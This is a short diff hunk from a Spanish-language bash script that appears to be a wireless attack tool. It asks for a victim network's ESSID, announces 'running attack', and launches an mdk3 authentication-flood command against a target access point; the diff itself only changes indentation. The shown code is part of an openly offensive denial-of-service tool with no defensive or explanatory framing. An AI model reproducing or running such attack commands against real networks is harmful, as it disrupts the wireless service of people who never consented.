@@ -270,13 +270,13 @@ read -p "añade el ESSID victima ➜ " essid
 	echo -e "$white"
 	echo -e "$essid" [$green✓$nc]
 
-echo -e "$nc" 
-echo -e "$Purple"
+	echo -e "$nc" 
+	echo -e "$Purple"
 echo "*-*-*-*-*-*-*-*-*-*-*-*-	"
 echo "   CORRIENDO ATAQUE 	"
 echo "*-*-*-*-*-*-*-*-*-*-*-*-	"
 mdk3 $interface$mon a -a $doc; bash
-echo -e "$nc"
+	echo -e "$nc"
 
     fi
 else
